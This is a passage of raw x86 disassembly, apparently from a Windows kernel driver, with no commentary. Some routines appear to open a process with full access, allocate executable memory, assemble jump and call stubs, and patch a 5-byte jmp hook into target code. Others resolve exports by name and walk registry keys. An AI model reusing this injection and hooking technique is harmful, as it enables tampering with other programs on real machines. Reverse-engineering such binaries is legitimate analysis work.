   1210a:	push   DWORD PTR [ebp-0xc]
   1210d:	call   0x116e0
   12112:	call   eax
   12114:	mov    edi,eax
   12116:	cmp    edi,esi
   12118:	jl     0x1216f
   1211a:	mov    eax,DWORD PTR [ebp+0x8]
   1211d:	mov    DWORD PTR [ebp-0x18],eax
   12120:	lea    eax,[ebp-0x18]
   12123:	push   eax
   12124:	lea    eax,[ebp-0x38]
   12127:	push   eax
   12128:	push   0x200
   1212d:	lea    eax,[ebp-0x8]
   12130:	push   eax
   12131:	call   0x1168c
   12136:	call   eax
   12138:	mov    edi,eax
   1213a:	cmp    edi,esi
   1213c:	jl     0x12165
   1213e:	mov    eax,DWORD PTR [ebp-0x4]
   12141:	push   0x8
   12143:	mov    DWORD PTR [ebp-0x20],eax
   12146:	lea    eax,[ebp-0x20]
   12149:	push   eax
   1214a:	push   0x9
   1214c:	push   DWORD PTR [ebp-0x8]
   1214f:	mov    DWORD PTR [ebp-0x1c],esi
   12152:	call   0x11902
   12157:	call   eax
   12159:	push   DWORD PTR [ebp-0x8]
   1215c:	mov    edi,eax
   1215e:	call   0x11956
   12163:	call   eax
   12165:	push   DWORD PTR [ebp-0x4]
   12168:	call   0x11956
   1216d:	call   eax
   1216f:	push   DWORD PTR [ebp-0xc]
   12172:	call   0x11956
   12177:	call   eax
   12179:	push   DWORD PTR [ebp-0x10]
   1217c:	call   0x11956
   12181:	call   eax
   12183:	mov    eax,edi
   12185:	pop    edi
   12186:	pop    esi
   12187:	leave  
   12188:	ret    0x4
   1218b:	int3   
   1218c:	int3   
   1218d:	int3   
   1218e:	int3   
   1218f:	int3   
   12190:	mov    edi,edi
   12192:	push   ebp
   12193:	mov    ebp,esp
   12195:	sub    esp,0x43c
   1219b:	mov    eax,ds:0x7e528
   121a0:	xor    eax,ebp
   121a2:	mov    DWORD PTR [ebp-0x4],eax
   121a5:	mov    eax,DWORD PTR [ebp+0xc]
   121a8:	push   ebx
   121a9:	push   esi
   121aa:	mov    esi,DWORD PTR [ebp+0x8]
   121ad:	push   edi
   121ae:	xor    ebx,ebx
   121b0:	push   0x3ff
   121b5:	mov    DWORD PTR [ebp-0x418],eax
   121bb:	lea    eax,[ebp-0x403]
   121c1:	push   ebx
   121c2:	push   eax
   121c3:	mov    DWORD PTR [ebp-0x424],esi
   121c9:	mov    BYTE PTR [ebp-0x404],bl
   121cf:	call   0x1daba
   121d4:	add    esp,0xc
   121d7:	lea    eax,[ebp-0x410]
   121dd:	push   eax
   121de:	push   0x400
   121e3:	lea    eax,[ebp-0x404]
   121e9:	push   eax
   121ea:	push   ebx
   121eb:	push   ebx
   121ec:	push   esi
   121ed:	jmp    0x1239c
   121f2:	cmp    eax,ebx
   121f4:	jl     0x123be
   121fa:	mov    eax,DWORD PTR [ebp-0x418]
   12200:	lea    edx,[eax+0x2]
   12203:	mov    cx,WORD PTR [eax]
   12206:	inc    eax
   12207:	inc    eax
   12208:	cmp    cx,bx
   1220b:	jne    0x12203
   1220d:	mov    ecx,DWORD PTR [ebp-0x3f8]
   12213:	sub    eax,edx
   12215:	shr    ecx,1
   12217:	sar    eax,1
   12219:	lea    esi,[ecx+eax*1+0x2]
   1221d:	xor    ecx,ecx
   1221f:	push   0x2
   12221:	pop    edx
   12222:	mov    eax,esi
   12224:	mul    edx
   12226:	seto   cl
   12229:	neg    ecx
   1222b:	or     ecx,eax
   1222d:	push   ecx
   1222e:	call   0x10a52
   12233:	mov    edi,eax
   12235:	lea    eax,[esi+esi*1]
   12238:	push   eax
   12239:	push   ebx
   1223a:	push   edi
   1223b:	mov    DWORD PTR [ebp-0x40c],edi
   12241:	call   0x1daba
   12246:	mov    eax,DWORD PTR [ebp-0x418]
   1224c:	add    esp,0x10
   1224f:	mov    ecx,eax
   12251:	mov    dx,WORD PTR [eax]
   12254:	inc    eax
   12255:	inc    eax
   12256:	cmp    dx,bx
   12259:	jne    0x12251
   1225b:	sub    eax,ecx
   1225d:	dec    edi
   1225e:	mov    esi,ecx
   12260:	dec    edi
   12261:	mov    cx,WORD PTR [edi+0x2]
   12265:	inc    edi
   12266:	inc    edi
   12267:	cmp    cx,bx
   1226a:	jne    0x12261
   1226c:	mov    ecx,eax
   1226e:	shr    ecx,0x2
   12271:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   12273:	mov    ecx,eax
   12275:	and    ecx,0x3
   12278:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   1227a:	mov    edi,DWORD PTR [ebp-0x40c]
   12280:	dec    edi
   12281:	dec    edi
   12282:	mov    ax,WORD PTR [edi+0x2]
   12286:	inc    edi
   12287:	inc    edi
   12288:	cmp    ax,bx
   1228b:	jne    0x12282
   1228d:	mov    esi,0x1de6a
   12292:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   12293:	mov    eax,DWORD PTR [ebp-0x3f8]
   12299:	shr    eax,1
   1229b:	push   eax
   1229c:	lea    eax,[ebp-0x3f4]
   122a2:	push   eax
   122a3:	push   DWORD PTR [ebp-0x40c]
   122a9:	call   0x1dad2
   122ae:	mov    esi,DWORD PTR [ebp-0x40c]
   122b4:	mov    eax,esi
   122b6:	add    esp,0xc
   122b9:	mov    DWORD PTR [ebp-0x41c],esi
   122bf:	lea    edx,[eax+0x2]
   122c2:	mov    cx,WORD PTR [eax]
   122c5:	inc    eax
   122c6:	inc    eax
   122c7:	cmp    cx,bx
   122ca:	jne    0x122c2
   122cc:	sub    eax,edx
   122ce:	sar    eax,1
   122d0:	add    eax,eax
   122d2:	mov    WORD PTR [ebp-0x41e],ax
   122d9:	mov    WORD PTR [ebp-0x420],ax
   122e0:	lea    eax,[ebp-0x420]
   122e6:	mov    DWORD PTR [ebp-0x434],eax
   122ec:	lea    eax,[ebp-0x43c]
   122f2:	push   eax
   122f3:	push   0xf003f
   122f8:	lea    eax,[ebp-0x414]
   122fe:	push   eax
   122ff:	mov    DWORD PTR [ebp-0x43c],0x18
   12309:	mov    DWORD PTR [ebp-0x438],ebx
   1230f:	mov    DWORD PTR [ebp-0x430],0x40
   12319:	mov    DWORD PTR [ebp-0x42c],ebx
   1231f:	mov    DWORD PTR [ebp-0x428],ebx
   12325:	call   0x117b2
   1232a:	call   eax
   1232c:	push   esi
   1232d:	test   eax,eax
   1232f:	jl     0x123b8
   12335:	push   DWORD PTR [ebp-0x414]
   1233b:	call   0x12190
   12340:	push   esi
   12341:	mov    BYTE PTR [ebp-0x405],al
   12347:	call   0x10a86
   1234c:	pop    ecx
   1234d:	push   DWORD PTR [ebp-0x414]
   12353:	call   0x117dc
   12358:	call   eax
   1235a:	test   eax,eax
   1235c:	jl     0x123be
   1235e:	cmp    BYTE PTR [ebp-0x405],bl
   12364:	je     0x123be
   12366:	push   0x3ff
   1236b:	lea    eax,[ebp-0x403]
   12371:	push   ebx
   12372:	push   eax
   12373:	mov    BYTE PTR [ebp-0x404],bl
   12379:	call   0x1daba
   1237e:	add    esp,0xc
   12381:	lea    eax,[ebp-0x410]
   12387:	push   eax
   12388:	push   0x400
   1238d:	lea    eax,[ebp-0x404]
   12393:	push   eax
   12394:	push   ebx
   12395:	push   ebx
   12396:	push   DWORD PTR [ebp-0x424]
   1239c:	mov    DWORD PTR [ebp-0x410],ebx
   123a2:	call   0x119aa
   123a7:	call   eax
   123a9:	cmp    eax,0x8000001a
   123ae:	jne    0x121f2
   123b4:	mov    al,0x1
   123b6:	jmp    0x123c0
   123b8:	call   0x10a86
   123bd:	pop    ecx
   123be:	xor    al,al
   123c0:	mov    ecx,DWORD PTR [ebp-0x4]
   123c3:	pop    edi
   123c4:	pop    esi
   123c5:	xor    ecx,ebp
   123c7:	pop    ebx
   123c8:	call   0x1da55
   123cd:	leave  
   123ce:	ret    0x8
   123d1:	int3   
   123d2:	int3   
   123d3:	int3   
   123d4:	int3   
   123d5:	int3   
   123d6:	mov    eax,ds:0x7ef2c
   123db:	test   eax,eax
   123dd:	je     0x123ee
   123df:	push   eax
   123e0:	call   0x11a28
   123e5:	call   eax
   123e7:	and    DWORD PTR ds:0x7ef2c,0x0
   123ee:	ret    
   123ef:	int3   
   123f0:	int3   
   123f1:	int3   
   123f2:	int3   
   123f3:	int3   
   123f4:	push   0x28
   123f6:	push   0x7e128
   123fb:	call   0x1daf8
   12400:	xor    eax,eax
   12402:	mov    DWORD PTR [ebp-0x28],eax
   12405:	mov    DWORD PTR [ebp-0x2c],eax
   12408:	mov    ebx,DWORD PTR [ebp+0x8]
   1240b:	cmp    ebx,eax
   1240d:	jne    0x12416
   1240f:	xor    eax,eax
   12411:	jmp    0x124f3
   12416:	mov    DWORD PTR [ebp-0x4],eax
   12419:	lea    ecx,[ebp-0x2c]
   1241c:	push   ecx
   1241d:	push   eax
   1241e:	push   0x1
   12420:	push   ebx
   12421:	call   0x118ae
   12426:	call   eax
   12428:	mov    edx,eax
   1242a:	sub    edx,ebx
   1242c:	mov    DWORD PTR [ebp-0x38],edx
   1242f:	mov    esi,DWORD PTR [eax+0x1c]
   12432:	add    esi,ebx
   12434:	mov    edi,DWORD PTR [eax+0x24]
   12437:	add    edi,ebx
   12439:	mov    ecx,DWORD PTR [eax+0x20]
   1243c:	add    ecx,ebx
   1243e:	and    DWORD PTR [ebp-0x20],0x0
   12442:	mov    ebx,DWORD PTR [ebp-0x20]
   12445:	cmp    ebx,DWORD PTR [eax+0x18]
   12448:	jae    0x124db
   1244e:	movsx  ebx,WORD PTR [edi+ebx*2]
   12452:	cmp    ebx,DWORD PTR [eax+0x14]
   12455:	jae    0x124cf
   12457:	lea    ebx,[esi+ebx*4]
   1245a:	mov    DWORD PTR [ebp-0x34],ebx
   1245d:	cmp    DWORD PTR [ebx],edx
   1245f:	jb     0x1246d
   12461:	mov    ebx,DWORD PTR [ebp-0x2c]
   12464:	add    edx,ebx
   12466:	mov    ebx,DWORD PTR [ebp-0x34]
   12469:	cmp    DWORD PTR [ebx],edx
   1246b:	jb     0x124c4
   1246d:	mov    edx,DWORD PTR [ebp+0xc]
   12470:	mov    DWORD PTR [ebp-0x30],edx
   12473:	mov    edx,DWORD PTR [ebp-0x20]
   12476:	mov    edx,DWORD PTR [ecx+edx*4]
   12479:	add    edx,DWORD PTR [ebp+0x8]
   1247c:	mov    DWORD PTR [ebp-0x24],edx
   1247f:	mov    dl,BYTE PTR [edx]
   12481:	mov    ebx,DWORD PTR [ebp-0x30]
   12484:	cmp    dl,BYTE PTR [ebx]
   12486:	jne    0x124b1
   12488:	test   dl,dl
   1248a:	je     0x124ad
   1248c:	mov    edx,DWORD PTR [ebp-0x24]
   1248f:	mov    dl,BYTE PTR [edx+0x1]
   12492:	mov    BYTE PTR [ebp-0x19],dl
   12495:	cmp    dl,BYTE PTR [ebx+0x1]
   12498:	jne    0x124b1
   1249a:	mov    edx,DWORD PTR [ebp-0x24]
   1249d:	inc    edx
   1249e:	inc    edx
   1249f:	mov    DWORD PTR [ebp-0x24],edx
   124a2:	inc    ebx
   124a3:	inc    ebx
   124a4:	mov    DWORD PTR [ebp-0x30],ebx
   124a7:	cmp    BYTE PTR [ebp-0x19],0x0
   124ab:	jne    0x1247f
   124ad:	xor    edx,edx
   124af:	jmp    0x124b6
   124b1:	sbb    edx,edx
   124b3:	sbb    edx,0xffffffff
   124b6:	test   edx,edx
   124b8:	jne    0x124c4
   124ba:	mov    eax,DWORD PTR [ebp-0x34]
   124bd:	mov    eax,DWORD PTR [eax]
   124bf:	add    eax,DWORD PTR [ebp+0x8]
   124c2:	jmp    0x124e9
   124c4:	inc    DWORD PTR [ebp-0x20]
   124c7:	mov    edx,DWORD PTR [ebp-0x38]
   124ca:	jmp    0x12442
   124cf:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   124d6:	jmp    0x1240f
   124db:	mov    eax,DWORD PTR [ebp-0x28]
   124de:	jmp    0x124ec
   124e0:	xor    eax,eax
   124e2:	inc    eax
   124e3:	ret    
   124e4:	mov    esp,DWORD PTR [ebp-0x18]
   124e7:	xor    eax,eax
   124e9:	mov    DWORD PTR [ebp-0x28],eax
   124ec:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   124f3:	call   0x1db3d
   124f8:	ret    0x8
   124fb:	int3   
   124fc:	int3   
   124fd:	int3   
   124fe:	int3   
   124ff:	int3   
   12500:	mov    edi,edi
   12502:	push   ebp
   12503:	mov    ebp,esp
   12505:	sub    esp,0x48
   12508:	mov    eax,DWORD PTR [ebp+0xc]
   1250b:	mov    eax,DWORD PTR [eax]
   1250d:	push   edi
   1250e:	mov    DWORD PTR [ebp-0x30],eax
   12511:	lea    eax,[ebp-0x30]
   12514:	push   eax
   12515:	lea    eax,[ebp-0x48]
   12518:	push   eax
   12519:	xor    edi,edi
   1251b:	push   0x1f0fff
   12520:	lea    eax,[ebp-0x10]
   12523:	push   eax
   12524:	mov    DWORD PTR [ebp-0x48],0x18
   1252b:	mov    DWORD PTR [ebp-0x44],edi
   1252e:	mov    DWORD PTR [ebp-0x3c],0x200
   12535:	mov    DWORD PTR [ebp-0x40],edi
   12538:	mov    DWORD PTR [ebp-0x38],edi
   1253b:	mov    DWORD PTR [ebp-0x34],edi
   1253e:	mov    DWORD PTR [ebp-0x2c],edi
   12541:	mov    DWORD PTR [ebp-0x10],edi
   12544:	call   0x1168c
   12549:	call   eax
   1254b:	test   eax,eax
   1254d:	jl     0x128a1
   12553:	push   ebx
   12554:	push   esi
   12555:	mov    esi,DWORD PTR ds:0x1f040
   1255b:	push   0x40
   1255d:	mov    ebx,0x1000
   12562:	push   ebx
   12563:	lea    eax,[ebp-0x14]
   12566:	push   eax
   12567:	push   edi
   12568:	lea    eax,[ebp-0xc]
   1256b:	push   eax
   1256c:	push   DWORD PTR [ebp-0x10]
   1256f:	mov    DWORD PTR [ebp-0xc],edi
   12572:	mov    DWORD PTR [ebp-0x14],0x400
   12579:	call   esi
   1257b:	test   eax,eax
   1257d:	jl     0x12588
   1257f:	mov    eax,DWORD PTR [ebp-0xc]
   12582:	mov    ecx,DWORD PTR [ebp+0xc]
   12585:	mov    DWORD PTR [ecx+0x8],eax
   12588:	push   0x4
   1258a:	push   ebx
   1258b:	lea    eax,[ebp-0x14]
   1258e:	push   eax
   1258f:	push   edi
   12590:	lea    eax,[ebp-0x18]
   12593:	push   eax
   12594:	push   DWORD PTR [ebp-0x10]
   12597:	mov    DWORD PTR [ebp-0x18],edi
   1259a:	mov    DWORD PTR [ebp-0x14],0x400
   125a1:	call   esi
   125a3:	test   eax,eax
   125a5:	jl     0x125b0
   125a7:	mov    eax,DWORD PTR [ebp-0x18]
   125aa:	mov    ecx,DWORD PTR [ebp+0xc]
   125ad:	mov    DWORD PTR [ecx+0xc],eax
   125b0:	lea    eax,[ebp-0x24]
   125b3:	push   eax
   125b4:	push   DWORD PTR [ebp-0x30]
   125b7:	call   0x11cc8
   125bc:	call   eax
   125be:	test   eax,eax
   125c0:	jl     0x1289f
   125c6:	push   DWORD PTR [ebp-0x24]
   125c9:	call   0x11a7c
   125ce:	call   eax
   125d0:	mov    eax,DWORD PTR [ebp-0xc]
   125d3:	mov    DWORD PTR [ebp-0x20],edi
   125d6:	cmp    eax,edi
   125d8:	je     0x12885
   125de:	mov    esi,DWORD PTR [ebp-0x18]
   125e1:	cmp    esi,edi
   125e3:	je     0x127f2
   125e9:	push   0x214
   125ee:	push   edi
   125ef:	push   esi
   125f0:	mov    DWORD PTR [ebp-0x4],eax
   125f3:	call   0x1daba
   125f8:	mov    eax,DWORD PTR [ebp-0x4]
   125fb:	add    esp,0xc
   125fe:	push   0x60
   12600:	lea    ebx,[esi+0xc]
   12603:	push   eax
   12604:	mov    DWORD PTR [ebx],edi
   12606:	mov    DWORD PTR [esi],edi
   12608:	mov    DWORD PTR [ebp-0x20],eax
   1260b:	call   0x19834
   12610:	push   0x68
   12612:	push   eax
   12613:	call   0x19834
   12618:	push   ebx
   12619:	push   eax
   1261a:	call   0x1984c
   1261f:	push   0x6a
   12621:	pop    ebx
   12622:	push   ebx
   12623:	push   eax
   12624:	call   0x19834
   12629:	push   edi
   1262a:	push   eax
   1262b:	call   0x19834
   12630:	push   ebx
   12631:	push   eax
   12632:	call   0x19834
   12637:	push   edi
   12638:	push   eax
   12639:	call   0x19834
   1263e:	push   0x68
   12640:	push   eax
   12641:	call   0x19834
   12646:	push   edi
   12647:	push   eax
   12648:	mov    DWORD PTR [ebp-0x28],eax
   1264b:	call   0x1984c
   12650:	push   ebx
   12651:	push   eax
   12652:	call   0x19834
   12657:	push   edi
   12658:	push   eax
   12659:	call   0x19834
   1265e:	push   ebx
   1265f:	push   eax
   12660:	call   0x19834
   12665:	push   edi
   12666:	push   eax
   12667:	call   0x19834
   1266c:	push   0xb8
   12671:	push   eax
   12672:	call   0x19834
   12677:	push   DWORD PTR ds:0x7ef78
   1267d:	push   eax
   1267e:	call   0x1984c
   12683:	mov    ebx,0xc00b
   12688:	push   ebx
   12689:	push   eax
   1268a:	call   0x19866
   1268f:	push   0x74
   12691:	push   eax
   12692:	call   0x19834
   12697:	push   0x9
   12699:	push   eax
   1269a:	call   0x19834
   1269f:	mov    edi,0xd0ff
   126a4:	push   edi
   126a5:	push   eax
   126a6:	call   0x19866
   126ab:	push   0xb9
   126b0:	push   eax
   126b1:	call   0x19834
   126b6:	lea    ecx,[esi+0x10]
   126b9:	push   ecx
   126ba:	push   eax
   126bb:	call   0x1984c
   126c0:	push   0x189
   126c5:	push   eax
   126c6:	call   0x19866
   126cb:	push   0x61
   126cd:	push   eax
   126ce:	call   0x19834
   126d3:	and    DWORD PTR [ebp-0x8],0x0
   126d7:	mov    DWORD PTR [ebp-0x4],eax
   126da:	mov    eax,DWORD PTR [ebp+0x8]
   126dd:	mov    DWORD PTR [ebp-0x1c],eax
   126e0:	push   0x0
   126e2:	push   DWORD PTR [ebp-0x1c]
   126e5:	push   DWORD PTR [ebp-0x4]
   126e8:	call   0x19fe8
   126ed:	mov    ecx,eax
   126ef:	sub    ecx,DWORD PTR [ebp-0x1c]
   126f2:	mov    DWORD PTR [ebp-0x1c],eax
   126f5:	add    DWORD PTR [ebp-0x8],ecx
   126f8:	add    DWORD PTR [ebp-0x4],ecx
   126fb:	cmp    DWORD PTR [ebp-0x8],0x5
   126ff:	jb     0x126e0
   12701:	mov    ecx,DWORD PTR [ebp+0x8]
   12704:	push   DWORD PTR [ebp-0x4]
   12707:	mov    eax,DWORD PTR [ebp-0x8]
   1270a:	add    eax,ecx
   1270c:	push   eax
   1270d:	call   0x198aa
   12712:	push   eax
   12713:	push   DWORD PTR [ebp-0x28]
   12716:	mov    DWORD PTR [ebp-0x4],eax
   12719:	call   0x1984c
   1271e:	mov    eax,DWORD PTR [ebp-0x4]
   12721:	push   0xeb
   12726:	push   eax
   12727:	mov    DWORD PTR [esi],eax
   12729:	call   0x19834
   1272e:	push   0x0
   12730:	push   eax
   12731:	mov    DWORD PTR [esi+0x4],eax
   12734:	call   0x19834
   12739:	push   0x68
   1273b:	push   eax
   1273c:	call   0x19834
   12741:	push   0x3e8
   12746:	push   eax
   12747:	call   0x1984c
   1274c:	push   0xb8
   12751:	push   eax
   12752:	call   0x19834
   12757:	push   DWORD PTR ds:0x7ef7c
   1275d:	push   eax
   1275e:	call   0x1984c
   12763:	push   ebx
   12764:	push   eax
   12765:	call   0x19866
   1276a:	push   0x74
   1276c:	push   eax
   1276d:	call   0x19834
   12772:	push   0x2
   12774:	push   eax
   12775:	call   0x19834
   1277a:	push   edi
   1277b:	push   eax
   1277c:	call   0x19866
   12781:	push   eax
   12782:	push   DWORD PTR [esi]
   12784:	call   0x198aa
   12789:	mov    cl,al
   1278b:	sub    cl,BYTE PTR [esi+0x4]
   1278e:	push   0x68
   12790:	dec    cl
   12792:	push   eax
   12793:	mov    BYTE PTR [esi+0x8],cl
   12796:	call   0x19834
   1279b:	add    esi,0x14
   1279e:	push   esi
   1279f:	push   eax
   127a0:	call   0x1984c
   127a5:	push   0xb8
   127aa:	push   eax
   127ab:	call   0x19834
   127b0:	push   DWORD PTR ds:0x7ef70
   127b6:	push   eax
   127b7:	call   0x1984c
   127bc:	push   ebx
   127bd:	push   eax
   127be:	call   0x19866
   127c3:	push   0x74
   127c5:	push   eax
   127c6:	call   0x19834
   127cb:	push   0x2
   127cd:	push   eax
   127ce:	call   0x19834
   127d3:	push   edi
   127d4:	push   eax
   127d5:	call   0x19866
   127da:	push   0xc2
   127df:	push   eax
   127e0:	call   0x19834
   127e5:	push   0x4
   127e7:	push   eax
   127e8:	call   0x19866
   127ed:	mov    eax,DWORD PTR [ebp-0xc]
   127f0:	xor    edi,edi
   127f2:	cmp    eax,edi
   127f4:	je     0x12885
   127fa:	add    eax,0x400
   127ff:	lea    esi,[eax-0xc]
   12802:	lea    ecx,[eax-0x8]
   12805:	push   esi
   12806:	lea    ebx,[eax-0x4]
   12809:	lea    edx,[eax-0x10]
   1280c:	push   0x40
   1280e:	add    eax,0xffffffe8
   12811:	push   ecx
   12812:	mov    DWORD PTR [ebp-0x1c],eax
   12815:	mov    eax,DWORD PTR [ebp+0x8]
   12818:	mov    DWORD PTR [ebx],eax
   1281a:	push   ebx
   1281b:	mov    DWORD PTR [ecx],0x5
   12821:	push   0xffffffff
   12823:	mov    DWORD PTR [ebp-0x8],ecx
   12826:	mov    DWORD PTR [ebp-0x28],edx
   12829:	mov    DWORD PTR [esi],edi
   1282b:	call   DWORD PTR ds:0x7eeec
   12831:	test   eax,eax
   12833:	jl     0x12885
   12835:	mov    eax,DWORD PTR [ebp-0x20]
   12838:	sub    eax,DWORD PTR [ebp+0x8]
   1283b:	sub    eax,0x5
   1283e:	push   eax
   1283f:	mov    eax,DWORD PTR [ebp-0x1c]
   12842:	inc    eax
   12843:	push   eax
   12844:	call   0x1984c
   12849:	push   0xe9
   1284e:	push   DWORD PTR [ebp-0x1c]
   12851:	call   0x19834
   12856:	mov    eax,DWORD PTR [ebp-0x28]
   12859:	push   eax
   1285a:	push   0x5
   1285c:	push   DWORD PTR [ebp-0x1c]
   1285f:	mov    DWORD PTR [eax],edi
   12861:	push   DWORD PTR [ebp+0x8]
   12864:	push   0xffffffff
   12866:	call   DWORD PTR ds:0x7eee0
   1286c:	mov    eax,DWORD PTR [ebp+0xc]
   1286f:	mov    BYTE PTR [eax+0x10],0x1
   12873:	lea    eax,[ebp-0x20]
   12876:	push   eax
   12877:	push   DWORD PTR [esi]
   12879:	push   DWORD PTR [ebp-0x8]
   1287c:	push   ebx
   1287d:	push   0xffffffff
   1287f:	call   DWORD PTR ds:0x7eeec
   12885:	call   0x11a52
   1288a:	call   eax
   1288c:	mov    ecx,DWORD PTR [ebp-0x24]
   1288f:	call   DWORD PTR ds:0x1f05c
   12895:	push   DWORD PTR [ebp-0x10]
   12898:	call   0x11956
   1289d:	call   eax
   1289f:	pop    esi
   128a0:	pop    ebx
   128a1:	pop    edi
   128a2:	leave  
   128a3:	ret    0x8
   128a6:	int3   
   128a7:	int3   
   128a8:	int3   
   128a9:	int3   
   128aa:	int3   
   128ab:	int3   
   128ac:	mov    edi,edi
   128ae:	push   ebp
   128af:	mov    ebp,esp
   128b1:	sub    esp,0x18
   128b4:	and    DWORD PTR [ebp-0x18],0x0
   128b8:	push   edi
   128b9:	xor    eax,eax
   128bb:	lea    edi,[ebp-0x14]
   128be:	stos   DWORD PTR es:[edi],eax
   128bf:	stos   DWORD PTR es:[edi],eax
   128c0:	stos   DWORD PTR es:[edi],eax
   128c1:	stos   DWORD PTR es:[edi],eax
   128c2:	lea    eax,[ebp-0x18]
   128c5:	push   eax
   128c6:	push   0x1
   128c8:	call   0x10e90
   128cd:	pop    edi
   128ce:	test   al,al
   128d0:	je     0x12927
   128d2:	cmp    DWORD PTR [ebp-0x18],0x0
   128d6:	je     0x12927
   128d8:	lea    eax,[ebp-0x4]
   128db:	push   eax
   128dc:	push   DWORD PTR [ebp-0x18]
   128df:	call   0x11cc8
   128e4:	call   eax
   128e6:	test   eax,eax
   128e8:	jl     0x12927
   128ea:	push   esi
   128eb:	push   DWORD PTR [ebp-0x4]
   128ee:	call   0x11a7c
   128f3:	call   eax
   128f5:	mov    esi,DWORD PTR [ebp-0xc]
   128f8:	mov    eax,DWORD PTR [ebp+0x8]
   128fb:	lea    edx,[esi+0x14]
   128fe:	sub    edx,eax
   12900:	movzx  ecx,WORD PTR [eax]
   12903:	mov    WORD PTR [edx+eax*1],cx
   12907:	inc    eax
   12908:	inc    eax
   12909:	test   cx,cx
   1290c:	jne    0x12900
   1290e:	mov    eax,DWORD PTR [esi+0x4]
   12911:	mov    cl,BYTE PTR [esi+0x8]
   12914:	mov    BYTE PTR [eax],cl
   12916:	call   0x11a52
   1291b:	call   eax
   1291d:	mov    ecx,DWORD PTR [ebp-0x4]
   12920:	call   DWORD PTR ds:0x1f05c
   12926:	pop    esi
   12927:	leave  
   12928:	ret    0x4
   1292b:	int3   
   1292c:	int3   
   1292d:	int3   
   1292e:	int3   
   1292f:	int3   
   12930:	mov    edi,edi
   12932:	push   ebp
   12933:	mov    ebp,esp
   12935:	push   ecx
   12936:	and    DWORD PTR [ebp-0x4],0x0
   1293a:	push   ebx
   1293b:	push   esi
   1293c:	push   edi
   1293d:	mov    esi,0x1000
   12942:	push   0x20736649
   12947:	push   esi
   12948:	push   0x0
   1294a:	call   DWORD PTR ds:0x1f060
   12950:	mov    edi,eax
   12952:	test   edi,edi
   12954:	je     0x12988
   12956:	lea    eax,[ebp-0x4]
   12959:	push   eax
   1295a:	push   esi
   1295b:	push   edi
   1295c:	push   DWORD PTR [ebp+0x8]
   1295f:	call   0x11788
   12964:	call   eax
   12966:	mov    ebx,eax
   12968:	cmp    ebx,0xc0000004
   1296e:	jne    0x1297b
   12970:	push   0x0
   12972:	push   edi
   12973:	call   DWORD PTR ds:0x1f01c
   12979:	add    esi,esi
   1297b:	test   ebx,ebx
   1297d:	jne    0x12942
   1297f:	mov    eax,edi
   12981:	pop    edi
   12982:	pop    esi
   12983:	pop    ebx
   12984:	leave  
   12985:	ret    0x4
   12988:	xor    eax,eax
   1298a:	jmp    0x12981
   1298c:	int3   
   1298d:	int3   
   1298e:	int3   
   1298f:	int3   
   12990:	int3   
   12991:	int3   
   12992:	push   0x0
   12994:	push   0x7eefc
   12999:	call   0x11c74
   1299e:	call   eax
   129a0:	push   0x100
   129a5:	push   0x0
   129a7:	push   0x7e5c0
   129ac:	call   0x1daba
   129b1:	add    esp,0xc
   129b4:	ret    
   129b5:	int3   
   129b6:	int3   
   129b7:	int3   
   129b8:	int3   
   129b9:	int3   
   129ba:	mov    edi,edi
   129bc:	push   ebp
   129bd:	mov    ebp,esp
   129bf:	push   esi
   129c0:	push   DWORD PTR [ebp+0xc]
   129c3:	mov    esi,ecx
   129c5:	push   DWORD PTR [ebp+0x8]
   129c8:	call   0x110b8
   129cd:	mov    eax,esi
   129cf:	pop    esi
   129d0:	pop    ebp
   129d1:	ret    0x8
   129d4:	int3   
   129d5:	int3   
   129d6:	int3   
   129d7:	int3   
   129d8:	int3   
   129d9:	int3   
   129da:	mov    edi,edi
   129dc:	push   ebp
   129dd:	mov    ebp,esp
   129df:	mov    eax,DWORD PTR [ebp+0x8]
   129e2:	push   esi
   129e3:	push   DWORD PTR [eax+0x4]
   129e6:	mov    esi,ecx
   129e8:	push   DWORD PTR [eax]
   129ea:	call   0x110b8
   129ef:	mov    eax,esi
   129f1:	pop    esi
   129f2:	pop    ebp
   129f3:	ret    0x4
   129f6:	int3   
   129f7:	int3   
   129f8:	int3   
   129f9:	int3   
   129fa:	int3   
   129fb:	int3   
   129fc:	mov    edi,edi
   129fe:	push   ebp
   129ff:	mov    ebp,esp
   12a01:	push   ebx
   12a02:	push   esi
   12a03:	push   edi
   12a04:	mov    edi,DWORD PTR [ebp+0x8]
   12a07:	mov    eax,DWORD PTR [edi+0x4]
   12a0a:	mov    esi,ecx
   12a0c:	mov    ebx,DWORD PTR [esi]
   12a0e:	mov    DWORD PTR [esi+0x4],eax
   12a11:	inc    eax
   12a12:	push   eax
   12a13:	call   0x10a52
   12a18:	push   DWORD PTR [esi+0x4]
   12a1b:	mov    DWORD PTR [esi],eax
   12a1d:	push   DWORD PTR [edi]
   12a1f:	push   eax
   12a20:	call   0x1dac6
   12a25:	mov    eax,DWORD PTR [esi+0x4]
   12a28:	mov    ecx,DWORD PTR [esi]
   12a2a:	push   ebx
   12a2b:	mov    BYTE PTR [eax+ecx*1],0x0
   12a2f:	call   0x10a86
   12a34:	add    esp,0x14
   12a37:	pop    edi
   12a38:	mov    eax,esi
   12a3a:	pop    esi
   12a3b:	pop    ebx
   12a3c:	pop    ebp
   12a3d:	ret    0x4
   12a40:	int3   
   12a41:	int3   
   12a42:	int3   
   12a43:	int3   
   12a44:	int3   
   12a45:	int3   
   12a46:	mov    edi,edi
   12a48:	push   esi
   12a49:	push   edi
   12a4a:	push   0x20736649
   12a4f:	push   0x20
   12a51:	push   0x0
   12a53:	mov    esi,ecx
   12a55:	call   DWORD PTR ds:0x1f060
   12a5b:	push   0x0
   12a5d:	mov    edi,eax
   12a5f:	push   0x1
   12a61:	mov    ecx,esi
   12a63:	mov    DWORD PTR [esi],edi
   12a65:	call   0x11116
   12a6a:	mov    DWORD PTR [esi+0x8],eax
   12a6d:	mov    DWORD PTR [esi+0xc],edx
   12a70:	test   edi,edi
   12a72:	jne    0x12a7f
   12a74:	push   0xc000009a
   12a79:	call   DWORD PTR ds:0x1f014
   12a7f:	pop    edi
   12a80:	mov    eax,esi
   12a82:	pop    esi
   12a83:	ret    
   12a84:	int3   
   12a85:	int3   
   12a86:	int3   
   12a87:	int3   
   12a88:	int3   
   12a89:	int3   
   12a8a:	mov    edi,edi
   12a8c:	push   ebp
   12a8d:	mov    ebp,esp
